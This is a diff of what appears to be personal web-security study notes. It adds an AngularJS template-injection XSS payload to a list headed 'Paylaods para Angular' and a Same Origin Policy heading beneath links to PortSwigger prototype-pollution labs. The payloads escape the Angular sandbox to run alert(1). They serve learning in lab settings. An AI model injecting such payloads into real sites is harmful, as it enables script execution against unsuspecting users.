@@ -9346,6 +9346,7 @@ Paylaods para Angular
 	{{ this.toString() }}
 	{{ constructor.toString() }}
 	{{ constructor.constructor('alert(1)')() }}
+	1&{{{{}}.")Ready;alert(1)//"}}
 
 
 LABS
@@ -9383,6 +9384,8 @@ LABS
 [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
 
 [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
+
+SOP - Same Origin Policy
 
 ## PTA
 
